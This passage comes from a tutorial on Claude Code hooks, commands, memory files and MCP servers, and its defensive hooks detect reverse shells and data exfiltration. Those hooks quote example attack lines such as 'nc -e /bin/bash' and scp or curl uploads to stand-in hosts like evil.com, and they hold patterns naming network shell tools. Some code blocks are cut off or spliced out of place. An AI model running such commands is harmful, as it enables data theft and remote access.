      }
    ]
  }
}
```

**Why this matters**: Creates a tamper-proof audit trail (with UTC timestamps!) while actively preventing commands that could be used for privilege escalation, data destruction, or network backdoors. Perfect for compliance requirements and incident investigation.

### 22. Network Activity Monitor
### *The "Who's Talking to Who?" Watchdog* 🌐

**Simple explanation**: Like having a security guard who monitors everyone entering and leaving the building. This hook detects when you're using network tools and shows you what services are currently listening for connections on your system.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'if echo \"$1\" | grep -qE \"(curl|wget|nmap|nc|telnet|ssh)\"; then echo \"🌐 Network activity detected\"; netstat -tuln | grep LISTEN | head -5; fi' -- $(jq -r '.tool_input.command')"
          }
        ]
      }
    ]
  }
}
```

**Why this strengthens security awareness**: Network activity can be legitimate (downloading packages) or suspicious (data exfiltration). This hook raises awareness by showing active network listeners whenever you use network tools. It helps you spot unexpected services, identify potential backdoors, and maintain situational awareness about your system's network exposure.

### 23. Code Secrets Scanner
### *The "Secrets Police" Assistant* 🔐

**Simple explanation**: Like having a really paranoid friend who looks over your shoulder every time you write code and says "Hey, did you just write your password in there?" This hook scans every file you create or edit for things that look like API keys, passwords, or other secrets.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Write|Edit",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'FILE=$(jq -r \".tool_input.file_path // \\\"\\\"\" | grep -v \"null\"); if [ -n \"$FILE\" ]; then if grep -qE \"(password|secret|key|token)\\s*=\\s*['\\\"][^'\\\"]{10,}\" \"$FILE\" 2>/dev/null; then echo \"🔐 SECURITY: Potential hardcoded secret in $FILE\"; exit 2; fi; fi'"
          }
        ]
      }
    ]
  }
}
```

**The pattern it catches**: Lines that look like `api_key = "sk-1234567890abcdef"` or `password = "super_secret_123"`. If it finds anything suspicious, it **blocks the file write** (exit 2) and yells at you to use environment variables instead. Prevents the classic "oops I committed my API keys" disaster!

### 24. Vulnerability Database Checker
### *The "Is This Container Safe?" Scanner* 🛡️

**Simple explanation**: Like having a food safety inspector who checks every ingredient before it goes into your kitchen. This hook automatically scans Docker images for known vulnerabilities whenever you pull or run them, warning you about security risks.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'if echo \"$1\" | grep -q \"docker run\\|docker pull\"; then IMAGE=$(echo \"$1\" | grep -oE \"[a-zA-Z0-9._/-]+:[a-zA-Z0-9._-]+\" | head -1); if [ -n \"$IMAGE\" ]; then echo \"🛡️ Checking image $IMAGE for vulnerabilities...\"; if command -v trivy >/dev/null; then trivy image --severity HIGH,CRITICAL --quiet \"$IMAGE\" 2>/dev/null | head -5; fi; fi; fi' -- $(jq -r '.tool_input.command')"
          }
        ]
      }
    ]
  }
}
```

**Why this prevents supply chain attacks**: Container images often contain outdated packages with known CVEs. Running vulnerable containers is like inviting attackers in through the front door. This hook uses Trivy to scan images against vulnerability databases, giving you a security report before the container starts running. It's an essential defense against supply chain attacks in containerized environments.

### 25. File Integrity Monitor
### *The "File Fingerprint" Tracker* 🔍

**Simple explanation**: Like having a detective who takes fingerprints of every important document to prove it hasn't been tampered with. This hook calculates cryptographic hashes of files you modify and logs them with timestamps for integrity verification.

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Edit|Write",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'FILE=$(jq -r \".tool_input.file_path // \\\"\\\"\" | grep -v \"null\"); if [ -n \"$FILE\" ] && [ -f \"$FILE\" ]; then HASH=$(sha256sum \"$FILE\" | cut -d\" \" -f1); echo \"[$(date -u +\"%Y-%m-%d %H:%M:%S\")] FILE_INTEGRITY: $FILE:$HASH\" >> ~/.claude/integrity.log; fi'"
          }
        ]
      }
    ]
  }
}
```

**Why this supports forensic analysis**: File integrity monitoring is crucial for detecting unauthorized changes, supporting compliance audits, and forensic investigations. The SHA256 hashes create a cryptographic trail of all file modifications. If a critical file gets compromised, you can use this log to determine exactly when it changed and what the original content was.

### 26. Permission Escalation Detector
### *The "Who's Trying to Become Admin?" Monitor* ⬆️

**Simple explanation**: Like having a security system that alerts you whenever someone tries to use the master key. This hook detects attempts to gain elevated privileges (sudo, su, etc.) and logs who's trying to become admin.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'if echo \"$1\" | grep -qE \"(sudo|su -|pkexec|doas)\"; then echo \"⬆️ SECURITY: Permission escalation detected\"; CALLER_UID=$(ps -o uid= -p $PPID); if [ \"$CALLER_UID\" != \"0\" ]; then echo \"Non-root user attempting privilege escalation\"; fi; fi' -- $(jq -r '.tool_input.command')"
          }
        ]
      }
    ]
  }
}
```

**Why this catches attacks early**: Privilege escalation is often the first step in an attack - malware tries to gain admin rights to install itself permanently or access sensitive data. This hook creates an audit trail of all privilege escalation attempts, helping you spot both legitimate admin tasks and potential security breaches. It's essential for compliance and incident response.

### 27. Crypto Operation Monitor
### *The "Encryption Activity" Tracker* 🔐

**Simple explanation**: Like having a specialist who notices whenever someone is working with locks, keys, or safes. This hook detects cryptographic operations (key generation, encryption, signing) and logs what algorithms are being used.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'if echo \"$1\" | grep -qE \"(openssl|gpg|ssh-keygen|age)\"; then echo \"🔐 Cryptographic operation detected\"; echo \"Algorithm: $(echo \"$1\" | grep -oE \"(rsa|ecdsa|ed25519|aes|chacha20)\")\" | head -1; fi' -- $(jq -r '.tool_input.command')"
          }
        ]
      }
    ]
  }
}
```

**Why this improves crypto hygiene**: Cryptographic operations should be visible and auditable - you want to know when keys are generated, what algorithms are used, and when encryption/decryption happens. This hook helps track crypto activity for compliance, debugging, and security audits. It's also useful for detecting weak or deprecated algorithms before they become security risks.

### 28. Container Security Scanner
### *The "Container Safety Inspector" Assistant* 🛡️

**Simple explanation**: Like having a safety inspector who checks construction sites for dangerous practices. This hook examines Docker run commands for insecure configurations like privileged mode or running as root user.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'if echo \"$1\" | grep -q \"docker run\"; then if echo \"$1\" | grep -q \"--privileged\"; then echo \"⚠️ SECURITY: Privileged container detected\"; fi; if ! echo \"$1\" | grep -q \"--user\"; then echo \"⚠️ SECURITY: Container running as root\"; fi; fi' -- $(jq -r '.tool_input.command')"
          }
        ]
      }
    ]
  }
}
```

**Why this prevents container escapes**: Running containers with `--privileged` or as root user breaks container isolation and can lead to host system compromise. This hook warns you about dangerous container configurations that could be exploited for container escape attacks. It's like having security guardrails that prevent you from accidentally creating vulnerable deployments.

### 29. SQL Injection Pattern Detector
### *The "Dangerous SQL" Detector* 🚨

**Simple explanation**: Like having a database expert who slaps your hand every time you try to build SQL queries by gluing strings together. This hook spots SQL injection patterns in your code and stops you from writing vulnerable database queries.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Write|Edit",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'CONTENT=$(jq -r \".tool_input.new_string // .tool_input.content // \\\"\\\"\" | grep -v \"null\"); if echo \"$CONTENT\" | grep -qE \"(SELECT|INSERT|UPDATE|DELETE).*\\+.*['\\\"]\" 2>/dev/null; then echo \"🚨 SECURITY: Potential SQL injection pattern detected\"; echo \"Use parameterized queries!\"; exit 2; fi'"
          }
        ]
      }
    ]
  }
}
```

**Why this prevents database takeovers**: SQL injection is one of the most dangerous web vulnerabilities - it can lead to complete database compromise, data theft, and system takeover. This hook detects patterns like `"SELECT * FROM users WHERE id = " + userId` and **blocks the file write** (`exit 2`), forcing you to use parameterized queries instead. It's like having a database security expert preventing the #1 web application security risk.

### 30. Suspicious Network Patterns
### *The "Backdoor Detector" Alert System* 🚨

**Simple explanation**: Like having a security expert who recognizes the tools and techniques that hackers use to create backdoors. This hook detects command patterns commonly used for reverse shells and other malicious network activities.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'if echo \"$1\" | grep -qE \"(nc.*-e|bash.*tcp|python.*socket|perl.*socket)\"; then echo \"🚨 SECURITY: Potential reverse shell pattern detected\"; echo \"Command: $1\"; exit 2; fi' -- $(jq -r '.tool_input.command')"
          }
        ]
      }
    ]
  }
}
```

**Why this stops malicious activity**: Reverse shells are a common way for attackers to maintain persistent access to compromised systems. Commands like `nc -e /bin/bash` or `python -c "import socket..."` are classic backdoor techniques. This hook recognizes these patterns and **blocks them** (`exit 2`), preventing accidental or malicious execution of backdoor commands.

### 31. Certificate Validation Monitor
### *The "TLS Safety Checker" Assistant* ⚠️

**Simple explanation**: Like having a security guard who stops you from ignoring ID checks at a secure building. This hook warns you when you're disabling TLS certificate validation, which makes your connections vulnerable to man-in-the-middle attacks.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'if echo \"$1\" | grep -qE \"(curl.*-k|wget.*--no-check-certificate)\"; then echo \"⚠️ SECURITY: TLS certificate validation disabled\"; echo \"This makes the connection vulnerable to MITM attacks\"; fi' -- $(jq -r '.tool_input.command')"
          }
        ]
      }
    ]
  }
}
```

**Why certificate validation matters**: Disabling certificate validation (`curl -k` or `wget --no-check-certificate`) defeats the entire purpose of HTTPS. It makes your connection vulnerable to man-in-the-middle attacks where attackers can intercept and modify your traffic. This hook alerts you to these dangerous practices, helping prevent credential theft and data tampering.

### 32. Binary Execution Monitor
### *The "Unknown Program" Tracker* 🔍

**Simple explanation**: Like having a security system that logs whenever someone runs an unfamiliar program. This hook detects when you're executing binary files and logs their cryptographic fingerprints for tracking and analysis.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'BINARY=$(echo \"$1\" | awk \"{print \\$1}\"); if [ -f \"$BINARY\" ] && file \"$BINARY\" | grep -q \"executable\"; then HASH=$(sha256sum \"$BINARY\" | cut -d\" \" -f1); echo \"🔍 SECURITY: Executing binary $BINARY (SHA256: ${HASH:0:16}...)\"; fi' -- $(jq -r '.tool_input.command')"
          }
        ]
      }
    ]
  }
}
```

**Why this aids malware detection**: Unknown or modified binaries could be malware, backdoors, or compromised tools. This hook creates an execution log with SHA256 hashes that can be checked against malware databases or used for forensic analysis. It's like having a program execution audit trail that helps identify suspicious software and track binary provenance.

### 33. Data Exfiltration Detector
### *The "Data Leaving the Building" Monitor* 📤

**Simple explanation**: Like having a security guard who notices when someone is carrying boxes of documents out of the office. This hook detects commands that transfer data to external systems and logs where the data is going.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'if echo \"$1\" | grep -qE \"(curl.*-T|scp|rsync.*ssh|tar.*ssh)\"; then echo \"📤 SECURITY: Potential data transfer detected\"; echo \"Destination: $(echo \"$1\" | grep -oE \"[a-zA-Z0-9.-]+@[a-zA-Z0-9.-]+\")\"; fi' -- $(jq -r '.tool_input.command')"
          }
        ]
      }
    ]
  }
}
```

**Why this catches data theft**: Data exfiltration is how attackers steal sensitive information from compromised systems. Commands like `scp sensitive_file.txt attacker@evil.com` or `curl -T database.sql http://malicious.site` are red flags. This hook creates visibility into data transfers, helping detect both legitimate backups and malicious data theft attempts.

### 34. Process Injection Monitor
### *The "Memory Tampering" Detector* 💉

**Simple explanation**: Like having a security system that alerts when someone tries to mess with other people's work or inject themselves into ongoing projects. This hook detects attempts to attach debuggers or inject code into running processes.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'if echo \"$1\" | grep -qE \"(gdb.*attach|ptrace|inject|/proc/[0-9]+/mem)\"; then echo \"💉 SECURITY: Potential process injection/debugging detected\"; echo \"Target: $(echo \"$1\" | grep -oE \"[0-9]+\" | head -1)\"; fi' -- $(jq -r '.tool_input.command')"
          }
        ]
      }
    ]
  }
}
```

**Why this catches advanced attacks**: Process injection is a sophisticated attack technique where malware injects malicious code into legitimate running processes to hide and persist. Tools like `gdb attach` or direct `/proc/PID/mem` manipulation are common injection methods. This hook creates visibility into these advanced techniques, helping detect both legitimate debugging and malicious process manipulation.

### 35. Compliance Evidence Collector
### *The "Perfect Audit Trail" Recorder* 📁

**Simple explanation**: Like having a court stenographer who records every single action with perfect detail for legal purposes. This hook creates a comprehensive, tamper-evident audit log of every Claude Code activity with timestamps, user info, and session data.

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "*",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'SESSION_ID=$(jq -r \".session_id\"); TOOL=$(jq -r \".tool_name\"); TIMESTAMP=$(date -u +\"%Y-%m-%d %H:%M:%S UTC\"); echo \"{\\\"timestamp\\\":\\\"$TIMESTAMP\\\",\\\"session\\\":\\\"$SESSION_ID\\\",\\\"tool\\\":\\\"$TOOL\\\",\\\"user\\\":\\\"$(whoami)\\\",\\\"host\\\":\\\"$(hostname)\\\"}\" >> ~/.claude/compliance.jsonl'"
          }
        ]
      }
    ]
  }
}
```

**Why this satisfies auditors**: Compliance frameworks (SOX, HIPAA, PCI-DSS, etc.) require detailed audit trails of all system activities. This hook creates JSON-formatted logs with precise timestamps, user attribution, and session correlation. The JSONL format makes it easy to parse for compliance reporting, forensic analysis, and regulatory audits. It's your insurance policy against "we need to prove what happened" requests.

## Advanced Hook Patterns and Best Practices
### *Level Up Your Hook Game* 🎮

Now that you understand the basics, let's talk about some ninja-level hook techniques. Think of these as advanced cooking methods - once you master them, you can create some truly spectacular automation!

### 1. Conditional Logic in Hooks
### *The "Smart Decision Maker" Pattern* 🧠

**Simple explanation**: Like having a hook that can actually think about the situation and react differently. This one checks what day it is and what command you're running, then gives different advice accordingly.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'CMD=$(jq -r \".tool_input.command\"); if [ \"$(date +%u)\" -gt 5 ]; then echo \"🏖️ Weekend detected - are you sure about working?\"; fi; if echo \"$CMD\" | grep -q \"rm\"; then echo \"🗑️ Deletion command - double check!\"; fi'"
          }
        ]
      }
    ]
  }
}
```

**The clever bit**: This hook checks two things:
1. **Is it the weekend?** (`date +%u` gives day of week, >5 means Saturday/Sunday)
2. **Are you deleting something?** (looks for `rm` in the command)

Then it gives you different warnings based on what it finds. It's like having a hook with personality!

### 2. Environment-Specific Hooks
```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "*",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'if [ \"$ENVIRONMENT\" = \"production\" ]; then echo \"🚨 PRODUCTION environment detected!\"; echo \"Extra caution required.\"; sleep 2; fi'"
          }
        ]
      }
    ]
  }
}
```

### 3. Hook Chaining and Dependencies
```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Edit|Write",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'echo \"🔍 Pre-edit validation...\" && ~/.claude/scripts/validate-file.sh'"
          }
        ]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "Edit|Write",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'echo \"✨ Post-edit formatting...\" && ~/.claude/scripts/format-file.sh'"
          }
        ]
      }
    ]
  }
}
```

### 4. Dynamic Hook Configuration
```bash
# ~/.claude/scripts/dynamic-hook.sh
#!/bin/bash
CONFIG_FILE="$HOME/.claude/dynamic-settings.json"

# Load environment-specific settings
case "$ENVIRONMENT" in
  "production")
    cp "$HOME/.claude/hooks/production.json" "$CONFIG_FILE"
    ;;
  "staging")
    cp "$HOME/.claude/hooks/staging.json" "$CONFIG_FILE"
    ;;
  *)
    cp "$HOME/.claude/hooks/development.json" "$CONFIG_FILE"
    ;;
esac
```

### 5. Hook Performance Monitoring
```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "*",
        "hooks": [
          {
            "type": "command",
            "command": "echo $(($(date +%s%3N))) > /tmp/claude_hook_start_$$"
          }
        ]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "*",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'START=$(cat /tmp/claude_hook_start_$$ 2>/dev/null || echo 0); END=$(date +%s%3N); DURATION=$((END - START)); echo \"Hook execution: ${DURATION}ms\" >> ~/.claude/hook-performance.log; rm -f /tmp/claude_hook_start_$$'"
          }
        ]
      }
    ]
  }
}
```

## Hook Security and Best Practices
### *Don't Shoot Yourself in the Foot* 🔫🦶

Remember: hooks run with **your full user permissions**. This is like giving someone the keys to your house - it's incredibly powerful, but you want to make sure they're trustworthy and well-behaved!

### Security Considerations

**1. Principle of Least Privilege**
```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "*",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'if [ \"$(id -u)\" = \"0\" ]; then echo \"⚠️ Running as root - hooks have full system access\"; fi'"
          }
        ]
      }
    ]
  }
}
```

**2. Input Validation and Sanitization**
### *The "Trust But Verify" Rule* ✅

**Simple explanation**: Like a bouncer at a club who checks everyone's ID, even if they look familiar. Your hooks should always validate the data they receive before doing anything with it.

```bash
# Always validate hook inputs
#!/bin/bash
INPUT=$(jq -r '.tool_input.command' 2>/dev/null)
if [ $? -ne 0 ] || [ -z "$INPUT" ]; then
  echo "Invalid hook input" >&2
  exit 1
fi

# Sanitize for shell injection
SAFE_INPUT=$(printf '%q' "$INPUT")
```

**Why this matters**: Without validation, a malicious or corrupted JSON input could trick your hook into running dangerous commands. The `printf '%q'` part is like putting the input in a safe container where it can't escape and cause trouble.

**3. Error Handling and Logging**
```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "*",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'set -euo pipefail; { your-hook-command; } 2>&1 | tee -a ~/.claude/hook-errors.log'"
          }
        ]
      }
    ]
  }
}
```

### Performance Best Practices

**1. Timeout Protection**
```bash
#!/bin/bash
timeout 5s your-long-running-command || {
  echo "Hook timed out after 5 seconds" >&2
  exit 1
}
```

**2. Asynchronous Execution for Non-Critical Hooks**
```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "*",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'nohup ~/.claude/scripts/background-task.sh &'"
          }
        ]
      }
    ]
  }
}
```

**3. Selective Hook Activation**
```bash
#!/bin/bash
# Only run expensive hooks during business hours
HOUR=$(date +%H)
if [ "$HOUR" -ge 9 ] && [ "$HOUR" -le 17 ]; then
  ./expensive-hook-script.sh
fi
```

## Troubleshooting Hooks
### *When Your Robot Assistants Go Rogue* 🤖💥

Even the best hooks sometimes misbehave. Here's how to figure out what went wrong and fix it - think of this as your hook debugging toolkit!

### Common Issues and Solutions

**1. Hook Not Executing**
```bash
# Debug: Check if settings file is valid JSON
jq . ~/.claude/settings.json

# Check hook matcher patterns
echo "Testing matcher: Bash against: $(jq -r '.tool_name')"
```

**2. Permission Errors**
```bash
# Make hook scripts executable
chmod +x ~/.claude/scripts/*.sh

# Check file ownership
ls -la ~/.claude/settings.json
```

**3. Exit Code Behavior - The Hook's Way of Talking**
Think of exit codes like traffic lights for your hooks:

- **Exit code `0`** = 🟢 **Green light**: "Everything's good, keep going!"
- **Exit code `2`** = 🔴 **Red light**: "STOP! I'm blocking this command because it's dangerous!"
- **Other exit codes** = 🟡 **Yellow light**: "Something weird happened, but I'll let you continue with a warning"

This is how hooks communicate back to Claude Code about what happened.

**4. JSON Parsing Errors**
```bash
# Robust JSON parsing in hooks
#!/bin/bash
TOOL_NAME=$(echo "$1" | jq -r '.tool_name // "unknown"' 2>/dev/null)
if [ "$TOOL_NAME" = "null" ] || [ -z "$TOOL_NAME" ]; then
  echo "Failed to parse hook input" >&2
  exit 1
fi
```

### Hook Testing Framework

Create a testing setup for your hooks:

```bash
#!/bin/bash
# ~/.claude/scripts/test-hooks.sh

# Test hook with mock data
MOCK_DATA='{
  "tool_name": "Bash",
  "tool_input": {
    "command": "echo Hello World",
    "description": "Test command"
  },
  "session_id": "test-session"
}'

echo "Testing hooks with mock data..."
echo "$MOCK_DATA" | ~/.claude/scripts/your-hook.sh
```

            "type": "command",
            "command": "bash -c 'if echo \"$1\" | grep -q \"git push\"; then echo \"🚀 Triggering CI/CD pipeline...\"; curl -X POST \"$CI_WEBHOOK_URL\" -H \"Authorization: token $CI_TOKEN\" --data \"{\\\"ref\\\": \\\"$(git branch --show-current)\\\"}\" 2>/dev/null && echo \"✅ Pipeline triggered\"; fi' -- $(jq -r '.tool_input.command')"
          }
        ]
      }
    ]
  }
}
```

### Monitoring and Alerting Integration
```json

## Conclusion: Mastering Claude Code Hooks

Hooks transform Claude Code from an assistant into a fully integrated development environment that adapts to your workflow. Key takeaways:

1. **Start Simple**: Begin with basic logging hooks and gradually add complexity
2. **Security First**: Always validate inputs and avoid privilege escalation
3. **Performance Matters**: Keep hooks fast and use async execution for heavy operations
4. **Test Thoroughly**: Create mock data to test your hooks before deployment
5. **Document Everything**: Maintain clear documentation of your hook configurations

**Remember**: Hooks execute with your full user permissions. Use them responsibly and always validate inputs to prevent security issues.

> "With great hooks comes great responsibility." - Claude Code User Manual (probably)

The combination of Claude Code's intelligence with your custom automation creates a development environment that's not just smart, but perfectly tailored to your needs and security requirements.

## Troubleshooting and Common Issues

### Context Management Issues

**Problem**: Claude seems confused about project structure
**Solution**:
```bash
# Clear context and restart
/clear

# Provide fresh context
"I'm working on a Python application for data processing and analysis. Here's the current structure..."
```

**Problem**: Claude references old code patterns
**Solution**:
```bash
# Show current patterns explicitly
"The correct pattern for error handling in this project is shown in src/core.py lines 125-176"
```

### Permission and Access Issues

**Problem**: Claude can't access certain files or commands
**Solution**:
```bash
# Check permissions
/permissions

# Update as needed
claude --allow-tools=Read,Write,Edit,Bash,Glob,Grep
```

### Performance and Focus Issues

**Problem**: Claude is being too verbose or unfocused
**Solution**:
```bash
# Be more specific
"Just implement the OpenAI client class, don't explain the entire architecture"

# Use constraints
"Keep the implementation under 100 lines and focus on error handling"
```

**Problem**: Claude is making too many changes at once
**Solution**:
```bash
# Break down tasks
"Let's just implement the basic generate() method first"
"After that works, we'll add cost tracking in a separate step"
```

---

## Pro Tips and Hidden Features

### 1. Effective Prompting Techniques

**Be Specific About Scope:**
```bash
# ❌ Vague
"Fix the LLM code"

# ✅ Specific
"Fix the rate limiting logic in OpenAIClient.generate() method"
```

**Provide Context, Not Just Commands:**
```bash
# ❌ Command-only
"Add error handling"

# ✅ Context + Command
"The current API client doesn't handle rate limits properly. Add error handling that catches rate limit exceptions and implements exponential backoff like we do in our data processing code"
```

### 2. Leveraging Claude's Strengths

**Code Review and Analysis:**
```bash
"Review this implementation for potential security issues"
"Analyze the performance implications of this approach"
"Check if this follows our established patterns"
```

**Learning and Explanation:**
```bash
"Explain why this approach is better than alternatives"
"What are the trade-offs of this design decision?"
"How does this integrate with the rest of our architecture?"
```

### 3. Workflow Optimization

**Session Preparation:**
```bash
# Start sessions with clear objectives
"Today we're implementing API client integration. Key requirements: cost protection, rate limiting, error handling"

# Reference relevant context
"Use the patterns from src/core.py and follow our CLAUDE.md guidelines"
```

**Progress Tracking:**
```bash
# Regular check-ins
"What's the current status of our API integration?"
"What are the next steps to complete this feature?"
"Are we following our testing and documentation standards?"
```

### 4. Quality Assurance Integration

**Automated Quality Checks:**
```bash
# Claude runs quality checks automatically
"Before we commit, run the linting and type checking"
"Make sure all tests pass and coverage is above 80%"
"Update any documentation that references the changed code"
```

**Security and Best Practices:**
```bash
# Claude applies security awareness
"Review this code for potential security issues"
"Make sure we're not exposing API keys or sensitive data"
"Check that all external inputs are properly validated"
```

## Advanced Memory Management and Import Patterns

### Understanding CLAUDE.md Hierarchy

Claude Code uses a sophisticated memory system that allows for flexible project configuration:

```
~/.claude/CLAUDE.md          # Global user preferences
├── project1/
│   └── CLAUDE.md           # Project-specific rules
│       └── @docs/style.md  # Imported style guide
└── project2/
    └── CLAUDE.md           # Different project rules
```

### Advanced Import Patterns

**1. Conditional Imports Based on Context:**
```markdown
# CLAUDE.md
# Base configuration
- Use TypeScript for all new files
- Follow ESLint rules

# Environment-specific imports
@config/development.md   # Development-specific rules
@config/production.md    # Production deployment rules
@config/testing.md       # Testing conventions
```

**2. Team Collaboration Patterns:**
```markdown
# CLAUDE.md
# Shared team standards
@team/coding-standards.md
@team/git-workflow.md
@team/review-checklist.md

# Personal preferences (from ~/.claude/CLAUDE.md)
# These override team standards where applicable
```

**3. Dynamic Configuration Loading:**
```markdown
# CLAUDE.md
# Load configuration based on current task
@tasks/refactoring-rules.md     # When refactoring
@tasks/debugging-helpers.md      # For debugging sessions
@tasks/documentation-style.md    # When writing docs
```

### Memory Optimization Strategies

**1. Keeping CLAUDE.md Lean:**
```markdown
# ❌ Bad: Verbose and repetitive
When implementing new features, always ensure that you follow our coding standards which include using 2-space indentation, meaningful variable names that follow camelCase convention, comprehensive error handling with try-catch blocks...

# ✅ Good: Concise with imports
# Coding Standards
@standards/code-style.md
@standards/error-handling.md

# Quick Reference
- 2-space indentation
- camelCase for variables
- PascalCase for classes
```

**2. Project-Specific Overrides:**
```markdown
# ~/.claude/CLAUDE.md (Global)
- Always use async/await over promises
- Prefer functional programming patterns

# ./CLAUDE.md (Project-specific)
- Override: Use class-based components for this legacy project
- Override: Callbacks required for compatibility with old API
```

## Slash Commands and Custom Workflows

### Creating Powerful Custom Commands

**1. Project-Specific Commands:**
```bash
# .claude/commands/setup-feature.md
Create a new feature following our architecture:
1. Create feature folder in src/features/
2. Add index.ts with exports
3. Create types.ts for TypeScript interfaces
4. Create feature.test.ts with initial tests
5. Update main index to export feature
6. Add feature documentation to README

Usage: /setup-feature user-authentication
```

**2. Debugging Workflows:**
```bash
# .claude/commands/debug-performance.md
Analyze and fix performance issues:
1. Run performance profiler
2. Identify bottlenecks in the code
3. Check for N+1 queries
4. Analyze bundle size
5. Review async operations
6. Suggest optimizations

Include benchmark results before/after.
```

**3. Code Review Automation:**
```bash
# .claude/commands/review-pr.md
Review PR comprehensively:
1. Check code follows project conventions
2. Verify test coverage for changes
3. Security audit for vulnerabilities
4. Performance impact analysis
5. Documentation updates needed
6. Breaking changes assessment

Provide actionable feedback with examples.
```

### Advanced Command Patterns

**1. Chained Commands:**
```bash
# Create feature, test it, and prepare PR
/setup-feature authentication &&
/test-feature authentication &&
/prepare-pr feat: add authentication
```

**2. Parameterized Commands:**
```bash
# .claude/commands/scaffold.md
Scaffold new {{type}} named {{name}}:
- If type is "component": Create React component
- If type is "service": Create service class
- If type is "api": Create API endpoint

Example: /scaffold component UserProfile
```

  review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Claude Review
        run: |
          claude -p "Review this PR for security issues, performance concerns, and adherence to our coding standards" \
            --output-format json \
            > review.json
      - name: Post Review Comments
        run: |
          # Parse review.json and post as PR comments
```

**2. Automated Documentation Generation:**
```bash
# Generate API documentation
claude -p "Generate comprehensive API documentation from the codebase" \
  --output-format stream-json \
  --allow-tools Read,Glob \
  > api-docs.md

# Update changelog
claude -p "Generate changelog entries from recent commits" \
  --output-format markdown \
  > CHANGELOG.md
```

**3. Test Generation Pipeline:**
```bash
#!/bin/bash
# generate-tests.sh
for file in $(find src -name "*.ts" -not -name "*.test.ts"); do
  testfile="${file%.ts}.test.ts"
  if [ ! -f "$testfile" ]; then
    claude -p "Generate comprehensive tests for $file" \
      --output-format stream \
      > "$testfile"
  fi
done
```

### Headless Mode Best Practices

**1. Structured Output Formats:**
```bash
# JSON output for parsing
claude -p "Analyze code complexity" --output-format json

# Streaming for real-time processing
claude -p "Refactor legacy code" --output-format stream-json

# Markdown for documentation
claude -p "Generate README" --output-format markdown
```

**2. Error Handling in Scripts:**
```bash
#!/bin/bash
# Safe Claude Code execution
set -euo pipefail

output=$(claude -p "Run security audit" --output-format json 2>&1) || {
  echo "Claude Code failed with exit code $?"
  echo "Output: $output"
  exit 1
}

# Process successful output
echo "$output" | jq '.security_issues'
```

## MCP (Model Context Protocol) Server Integration

### Understanding MCP Servers

MCP servers extend Claude Code's capabilities by providing access to external tools and data sources:

**1. Available MCP Servers:**
```yaml
# claude_config.yaml
mcpServers:
  - name: playwright
    command: mcp-server-playwright
    description: Browser automation for testing

  - name: aws-docs
    command: mcp-server-aws
    description: Latest AWS documentation

  - name: context7
    command: mcp-server-context7
    description: General documentation lookup
```

**2. Using MCP in Development:**
```bash
# Frontend testing with Playwright MCP
"Use the Playwright MCP server to test the login flow on our staging site"

# AWS integration with documentation
"Check the aws-documentation MCP for the latest DynamoDB best practices"

# General documentation lookup
"Use Context7 MCP to find the latest React 19 patterns"
```

### Custom MCP Server Development

**1. Creating a Project-Specific MCP:**
```typescript
// mcp-changelogger/index.ts
import { MCPServer } from '@anthropic/mcp';

class ChangeloggerMCP extends MCPServer {
  async getTools() {
    return [{
      name: 'analyze_changelog',
      description: 'Analyze a changelog for patterns',
      parameters: {
        url: { type: 'string', required: true }
      }
    }];
  }

  async executeTool(name: string, params: any) {
    if (name === 'analyze_changelog') {
      // Custom changelog analysis logic
      return this.analyzeChangelog(params.url);
    }
  }
}
```

**2. Integrating MCP with Claude Code:**
```bash
# Using custom MCP server
"Use the changelogger MCP to analyze the React changelog"

# Combining multiple MCP servers
"Use playwright MCP to scrape the page, then use changelogger MCP to analyze it"
```

## Performance Optimization and Best Practices

### Optimizing Claude Code Sessions

**1. Context Window Management:**
```bash
# ❌ Bad: Loading entire codebase
